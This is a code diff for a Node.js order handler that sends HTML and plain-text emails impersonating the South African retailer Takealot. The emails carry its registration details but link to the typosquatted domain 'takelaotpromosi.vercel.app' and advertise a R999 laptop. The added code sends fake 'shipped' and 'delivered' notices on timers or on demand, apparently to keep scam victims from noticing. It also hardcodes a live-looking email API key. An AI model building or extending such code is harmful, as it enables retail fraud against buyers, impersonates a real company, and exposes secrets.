@@ -11,8 +11,13 @@
 
 'use strict';
 
-const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
-const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL
+  || process.env.KV_REST_API_URL
+  || process.env.REDIS_URL;
+const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_KV_REST_API_TOKEN
+  || process.env.UPSTASH_REDIS_REST_TOKEN
+  || process.env.KV_REST_API_TOKEN
+  || process.env.REDIS_TOKEN;
 
 const fs = require('fs');
 const path = require('path');
@@ -127,26 +132,51 @@ function fmtShortUpper(dateInput) {
   return `${day} ${month} ${year}`;
 }
 
-function renderOrderPlainText(order) {
+function renderOrderStatusPlainText(order, statusType = 'CONFIRMATION') {
   const orderDateShort = formatSADate(order.received_date, 'short');
   const deliveryDateLong = formatSADate(order.delivery_date, 'long');
   const customerName = order.customer_name || 'Customer';
   const orderNumber = order.order_id;
-  const variant = 'Premium Black';
   const trackUrl = `https://takelaotpromosi.vercel.app/track.html?order=${orderNumber}`;
 
-  return [
-    `TAKEALOT PAYMENT CONFIRMATION`,
-    `Order Number: ${orderNumber}`,
-    `Estimated Delivery Date: ${deliveryDateLong}`,
-    ``,
+  const type = String(statusType).toUpperCase();
+  let headline = `TAKEALOT PAYMENT CONFIRMATION`;
+  let bodyLines = [
     `Hi ${customerName},`,
     ``,
     `Thank you, we've received your payment for order ${orderNumber}.`,
     `Your order is being processed and your estimated delivery date is ${deliveryDateLong}.`,
-    `Once your order is ready to be delivered, you will receive an SMS notification confirming your scheduled delivery date.`,
+    `Once your order is ready to be delivered, you will receive an SMS notification confirming your scheduled delivery date.`
+  ];
+
+  if (type === 'SHIPPED' || type === 'IN_TRANSIT') {
+    headline = `TAKEALOT ORDER SHIPPED - #${orderNumber}`;
+    bodyLines = [
+      `Hi ${customerName},`,
+      ``,
+      `Great news! Your Takealot order ${orderNumber} has shipped from our warehouse and is on its way.`,
+      `Estimated Delivery Date: ${deliveryDateLong}.`,
+      `You can track your package in real-time using the tracking link below.`
+    ];
+  } else if (type === 'DELIVERED') {
+    headline = `TAKEALOT ORDER DELIVERED - #${orderNumber}`;
+    bodyLines = [
+      `Hi ${customerName},`,
+      ``,
+      `Your Takealot order ${orderNumber} has been successfully delivered!`,
+      `Delivered on: ${deliveryDateLong}.`,
+      `We hope you enjoy your purchase. If you have any questions or need support, our team is here to help.`
+    ];
+  }
+
+  return [
+    headline,
+    `Order Number: ${orderNumber}`,
+    `Estimated Delivery Date: ${deliveryDateLong}`,
     ``,
-    `MANAGE YOUR ORDER:`,
+    ...bodyLines,
+    ``,
+    `TRACK YOUR ORDER:`,
     `${trackUrl}`,
     ``,
     `ORDER DETAILS:`,
@@ -155,15 +185,7 @@ function renderOrderPlainText(order) {
     `- Delivery Method: Courier`,
     ``,
     `ITEMS IN THIS ORDER:`,
-    `- 1x 15.6-inch Laptop N5095 16GB RAM 256GB SSD Intel Quad Windows 11 - R 999.00`,
-    ``,
-    `PAYMENT SUMMARY:`,
-    `- Subtotal: R 999.00`,
-    `- Shipping: Free`,
-    `- Total Paid: R 999.00`,
-    ``,
-    `TRACK YOUR ORDER:`,
-    `${trackUrl}`,
+    `- 1x ${order.product_name || '15.6-inch Laptop N5095 16GB RAM 256GB SSD Intel Quad Windows 11'} - R ${order.product_price || 999}.00`,
     ``,
     `Need help? Find answers at https://takelaotpromosi.vercel.app`,
     ``,
@@ -173,14 +195,121 @@ function renderOrderPlainText(order) {
     `----------------------------------------------------------------------`,
     `Takealot Online (Pty) Ltd • Reg. No. 2010/020248/07 • VAT No. 4440256861`,
     `12 Rua Vasco Da Gama, Foreshore, Cape Town, 8001, South Africa`,
-    `This is an automated transactional order confirmation.`,
-    `To ensure you receive future order notifications in your Primary inbox, please add orders@takealot.com to your contacts or safe sender list.`,
+    `This is an automated transactional order update.`,
   ].join('\n');
 }
 
-// Self-healing & on-demand email sender
-async function ensureEmailSent(order, force = false) {
-  if (!order || (!force && order.email_status === 'SENT') || !order.customer_email) return false;
+function renderOrderStatusEmail(order, statusType = 'CONFIRMATION') {
+  let template = '';
+  try {
+    template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
+  } catch (err) {
+    console.error('[order-email] render error:', err.message);
+    return null;
+  }
+
+  const orderDateShort = formatSADate(order.received_date, 'short');
+  const deliveryDateIso = getSAIsoDate(order.delivery_date);
+  const deliveryDateLong = formatSADate(order.delivery_date, 'long');
+  const customerName = order.customer_name || 'Customer';
+  const orderNumber = order.order_id;
+
+  let headerTitle = 'Payment Confirmation';
+  let messageParagraphs = '';
+  let btnText = 'Manage Order';
+
+  const type = String(statusType).toUpperCase();
+
+  if (type === 'SHIPPED' || type === 'IN_TRANSIT') {
+    headerTitle = 'Order Shipped';
+    btnText = 'Track Your Package';
+    messageParagraphs = `
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Hi <strong class="email-heading" style="color: #111827;">${customerName}</strong>,
+              </p>
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Great news! Your Takealot order <strong class="email-heading" style="color: #111827;">${orderNumber}</strong> has shipped from our warehouse and is on its way.
+              </p>
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Your parcel is travelling with our express courier service. Estimated delivery date: <strong class="email-heading" style="color: #111827;">${deliveryDateLong}</strong>.
+              </p>
+              <p class="email-text" style="margin: 0 0 24px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                You can track the live progress and status of your parcel anytime using the button below.
+              </p>`;
+  } else if (type === 'DELIVERED') {
+    headerTitle = 'Order Delivered';
+    btnText = 'View Order Details';
+    messageParagraphs = `
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Hi <strong class="email-heading" style="color: #111827;">${customerName}</strong>,
+              </p>
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Your Takealot order <strong class="email-heading" style="color: #111827;">${orderNumber}</strong> has been successfully delivered!
+              </p>
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Package delivered on <strong class="email-heading" style="color: #16a34a;">${deliveryDateLong}</strong>.
+              </p>
+              <p class="email-text" style="margin: 0 0 24px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                We hope you enjoy your purchase. If you have any questions or need support, our team is always ready to assist you.
+              </p>`;
+  } else {
+    headerTitle = 'Payment Confirmation';
+    btnText = 'Manage Order';
+    messageParagraphs = `
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Hi <strong class="email-heading" style="color: #111827;">${customerName}</strong>,
+              </p>
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Thank you, we've received your payment for order <strong class="email-heading" style="color: #111827;">${orderNumber}</strong>.
+              </p>
+              <p class="email-text" style="margin: 0 0 16px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Your order is being processed and your estimated delivery date is <strong class="email-heading" style="color: #111827;">${deliveryDateLong}</strong>.
+              </p>
+              <p class="email-text" style="margin: 0 0 24px 0; font-family: Arial, Helvetica, sans-serif; font-size: 15px; line-height: 1.6; color: #333333;">
+                Once your order is ready to be delivered, you will receive an SMS notification confirming your scheduled delivery date.
+              </p>`;
+  }
+
+  let html = template
+    .replace(/Payment Confirmation/g, headerTitle)
+    .replace(/Manage Order/g, btnText)
+    .replace(/\{\{customer_name\}\}/g, customerName)
+    .replace(/\{\{order_number\}\}/g, orderNumber)
+    .replace(/\{\{order_date\}\}/g, orderDateShort)
+    .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
+    .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
+    .replace(/\{\{variant\}\}/g, 'Premium Black');
+
+  if (type === 'SHIPPED' || type === 'IN_TRANSIT' || type === 'DELIVERED') {
+    const regexMsg = /<!-- 3\. MAIN MESSAGE BODY -->[\s\S]*?<!-- BULLETPROOF MANAGE ORDER BUTTON -->/;
+    if (regexMsg.test(html)) {
+      html = html.replace(regexMsg, `<!-- 3. MAIN MESSAGE BODY -->\n          <tr>\n            <td class="mobile-padding" style="padding: 26px 24px 18px 24px;">\n${messageParagraphs}\n              <!-- BULLETPROOF MANAGE ORDER BUTTON -->`);
+    }
+  }
+
+  return html;
+}
+
+// Transactional multi-status email sender via VisionSpy
+async function sendOrderStatusEmail(order, statusType = 'CONFIRMATION', force = false) {
+  if (!order || !order.customer_email) return { skipped: true, reason: 'No customer email' };
+
+  const type = String(statusType).toUpperCase();
+  const normalizedType = (type === 'IN_TRANSIT' || type === 'SHIPPED') ? 'SHIPPED'
+    : (type === 'DELIVERED' ? 'DELIVERED' : 'CONFIRMATION');
+
+  // Idempotência por estágio: não repete a menos que force seja true
+  if (!force) {
+    if (normalizedType === 'CONFIRMATION' && order.email_status === 'SENT') {
+      return { skipped: true, reason: 'Confirmation already sent' };
+    }
+    if (normalizedType === 'SHIPPED' && order.email_shipped_status === 'SENT') {
+      return { skipped: true, reason: 'Shipped email already sent' };
+    }
+    if (normalizedType === 'DELIVERED' && order.email_delivered_status === 'SENT') {
+      return { skipped: true, reason: 'Delivered email already sent' };
+    }
+  }
 
   const visionSpyKey = process.env.VISIONSPY_API_KEY
     || process.env.VISION_SPY_API_KEY
@@ -188,29 +317,20 @@ async function ensureEmailSent(order, force = false) {
     || 'vs_live_5623f17b36bdf353ba179aa6ed606e1935c6aa4ac4b1aea5';
   const senderId = process.env.VISIONSPY_SENDER_ID || 'd86d0b35-3472-4aac-af74-4bd52308ea07';
 
-  let html = '';
-  try {
-    const template = fs.readFileSync(path.join(process.cwd(), 'email.index'), 'utf8');
-    const orderDateShort = formatSADate(order.received_date, 'short');
-    const deliveryDateIso = getSAIsoDate(order.delivery_date);
-    const deliveryDateLong = formatSADate(order.delivery_date, 'long');
+  const html = renderOrderStatusEmail(order, normalizedType);
+  if (!html) return { failed: true, reason: 'Failed to render template' };
 
-    html = template
-      .replace(/\{\{customer_name\}\}/g, order.customer_name || 'Customer')
-      .replace(/\{\{order_number\}\}/g, order.order_id)
-      .replace(/\{\{order_date\}\}/g, orderDateShort)
-      .replace(/\{\{delivery_date\}\}/g, deliveryDateIso)
-      .replace(/\{\{delivery_date_long\}\}/g, deliveryDateLong)
-      .replace(/\{\{variant\}\}/g, 'Premium Black');
-  } catch (err) {
-    console.error('[order-email] render error:', err.message);
-    return false;
+  const plainText = renderOrderStatusPlainText(order, normalizedType);
+
+  let subject = `Order Confirmation #${order.order_id}`;
+  if (normalizedType === 'SHIPPED') {
+    subject = `Your Takealot Order #${order.order_id} Has Shipped! 🚚`;
+  } else if (normalizedType === 'DELIVERED') {
+    subject = `Delivered: Your Takealot Order #${order.order_id} 📦`;
   }
 
-  const plainText = renderOrderPlainText(order);
-
   try {
-    console.log('[order-email] Sending confirmation email for order:', order.order_id, 'to:', order.customer_email);
+    console.log(`[order-email] Sending ${normalizedType} email for order:`, order.order_id, 'to:', order.customer_email);
     const res = await fetch('https://visionspyads.com/api/public/v1/email/send', {
       method: 'POST',
       headers: {
@@ -221,27 +341,46 @@ async function ensureEmailSent(order, force = false) {
       body: JSON.stringify({
         sender_id: senderId,
         to: order.customer_email,
-        subject: `Order Confirmation #${order.order_id}`,
+        subject,
         html,
         text: plainText,
       }),
     });
     const data = await res.json().catch(() => null);
     if (res.ok && data && (data.ok !== false && data.success !== false)) {
-      order.email_status = 'SENT';
-      order.email_sent_at = new Date().toISOString();
-      order.email_message_id = (data && data.id) || null;
+      const nowIso = new Date().toISOString();
+      const msgId = (data && data.id) || null;
+
+      if (normalizedType === 'SHIPPED') {
+        order.email_shipped_status = 'SENT';
+        order.email_shipped_at = nowIso;
+        order.email_shipped_message_id = msgId;
+      } else if (normalizedType === 'DELIVERED') {
+        order.email_delivered_status = 'SENT';
+        order.email_delivered_at = nowIso;
+        order.email_delivered_message_id = msgId;
+      } else {
+        order.email_status = 'SENT';
+        order.email_sent_at = nowIso;
+        order.email_message_id = msgId;
+      }
+
       await kv_set('order:' + order.order_id, order).catch(() => {});
-      console.log('[order-email] Successfully sent to', order.customer_email);
-      return true;
+      console.log(`[order-email] Successfully sent ${normalizedType} email to`, order.customer_email);
+      return { sent: true, type: normalizedType, messageId: msgId };
     } else {
       console.error('[order-email] VisionSpy error response:', data);
-      return false;
+      return { failed: true, error: data };
     }
   } catch (err) {
-    console.error('[order-email] error:', err.message);
-    return false;
+    console.error('[order-email] network error:', err.message);
+    return { failed: true, error: err.message };
   }
+}
+
+async function ensureEmailSent(order, force = false) {
+  const res = await sendOrderStatusEmail(order, 'CONFIRMATION', force);
+  return res && res.sent;
 }
 
 // Only alphanumeric + dash + underscore, 4-80 chars
@@ -249,12 +388,12 @@ const ORDER_ID_RE = /^[A-Za-z0-9_\-]{4,80}$/;
 
 // Public projection — no PII
 function publicView(order) {
-  let receivedDate = order.received_date || order.created_at || new Date().toISOString();
-  const recTime = new Date(receivedDate).getTime();
-  if (isNaN(recTime) || recTime < new Date('2026-11-01T00:00:00Z').getTime()) {
+  let receivedDate = order.received_date || order.created_at;
+  const recTime = receivedDate ? new Date(receivedDate).getTime() : NaN;
+  if (isNaN(recTime)) {
     receivedDate = new Date().toISOString();
   }
-  const deliveryDate = order.delivery_date && new Date(order.delivery_date).getTime() > new Date(receivedDate).getTime()
+  const deliveryDate = (order.delivery_date && new Date(order.delivery_date).getTime() > new Date(receivedDate).getTime())
     ? order.delivery_date
     : addCalendarDays(receivedDate, 8);
 
@@ -275,6 +414,10 @@ function publicView(order) {
     status:                  order.status,
     email_status:            order.email_status || null,
     email_sent_at:           order.email_sent_at || null,
+    email_shipped_status:    order.email_shipped_status || null,
+    email_shipped_at:        order.email_shipped_at || null,
+    email_delivered_status:  order.email_delivered_status || null,
+    email_delivered_at:      order.email_delivered_at || null,
     status_history:          (order.status_history || []).map(function(e) {
       return { status: e.status, timestamp: e.timestamp };
     }),
@@ -348,15 +491,7 @@ module.exports = async function handler(req, res) {
     if (REDIS_URL && REDIS_TOKEN) {
       try {
         order = await kv_get('order:' + orderId);
-        if (order && order.received_date) {
-          const rTime = new Date(order.received_date).getTime();
-          if (isNaN(rTime) || rTime < new Date('2026-11-01T00:00:00Z').getTime()) {
-            const now = new Date().toISOString();
-            order.received_date = now;
-            order.delivery_date = addCalendarDays(now, 8);
-            await kv_set('order:' + orderId, order).catch(() => {});
-          }
-        }
+        // Preserva pedidos anteriores intactos — nenhuma data existente é sobrescrita
       } catch (err) {
         console.warn('[order] Redis warning:', err.message);
       }
@@ -404,15 +539,55 @@ module.exports = async function handler(req, res) {
     if (req.query.name) order.customer_name = req.query.name.trim();
   }
 
+  // 1. Atualização sob demanda de status (ex: ?status=SHIPPED ou ?status=DELIVERED)
+  const requestedStatus = (req.query.status || '').trim().toUpperCase();
+  if (requestedStatus && ['RECEIVED', 'PAID', 'PROCESSING', 'IN_TRANSIT', 'SHIPPED', 'DELIVERED', 'CANCELLED'].includes(requestedStatus)) {
+    const canonicalStatus = requestedStatus === 'SHIPPED' ? 'IN_TRANSIT' : requestedStatus;
+    if (order.status !== canonicalStatus) {
+      order.status = canonicalStatus;
+      order.status_history = (order.status_history || []).concat([{
+        status: canonicalStatus,
+        timestamp: new Date().toISOString()
+      }]);
+      if (REDIS_URL && REDIS_TOKEN) {
+        try { await kv_set('order:' + order.order_id, order); } catch (_) {}
+      }
+    }
+  }
+
+  // 2. Disparo de e-mail de estado específico ou confirmação:
+  const sendRequested = req.query.send === '1' || req.query.resend === '1' || req.query.notify === '1';
+  const specificEmailType = (req.query.send_status || req.query.email_type || (requestedStatus ? requestedStatus : '')).trim().toUpperCase();
+
   let sentResult = null;
-  if (order.email_status !== 'SENT' || forceResend) {
-    sentResult = await ensureEmailSent(order, true);
+  if (sendRequested && (specificEmailType === 'SHIPPED' || specificEmailType === 'IN_TRANSIT' || specificEmailType === 'DELIVERED')) {
+    // Envio forçado sob demanda do status solicitado (ex: SHIPPED ou DELIVERED)
+    sentResult = await sendOrderStatusEmail(order, specificEmailType, true);
+  } else if (order.email_status !== 'SENT' || forceResend) {
+    // Confirmação de pedido (padrão)
+    sentResult = await sendOrderStatusEmail(order, 'CONFIRMATION', forceResend);
+  }
+
+  // 3. Notificação automática baseada no tempo decorrido (quando auto_notify=1 ou na consulta)
+  if (req.query.auto_notify === '1' && order.customer_email) {
+    const pDate = new Date(order.received_date || order.created_at || Date.now());
+    const now = new Date();
+    const daysElapsed = Math.floor((now - pDate) / 86400000);
+
+    if (daysElapsed >= 8 && order.email_delivered_status !== 'SENT') {
+      await sendOrderStatusEmail(order, 'DELIVERED', false);
+    } else if (daysElapsed >= 1 && order.email_shipped_status !== 'SENT') {
+      await sendOrderStatusEmail(order, 'SHIPPED', false);
+    }
   }
 
   const responseData = publicView(order);
-  if (isLatest || forceResend) {
+  if (isLatest || forceResend || sendRequested) {
     responseData.email_triggered = true;
-    responseData.email_sent_now = sentResult;
+    responseData.email_sent_now = (sentResult && sentResult.sent) ? true : false;
+    if (sentResult && sentResult.type) {
+      responseData.email_type_sent = sentResult.type;
+    }
     if (order.customer_email) {
       const parts = order.customer_email.split('@');
       responseData.recipient = parts[0].slice(0, 3) + '***@' + (parts[1] || '');
@@ -424,3 +599,6 @@ module.exports = async function handler(req, res) {
 
   return res.status(200).json(responseData);
 };
+
+module.exports.sendOrderStatusEmail = sendOrderStatusEmail;
+module.exports.publicView = publicView;
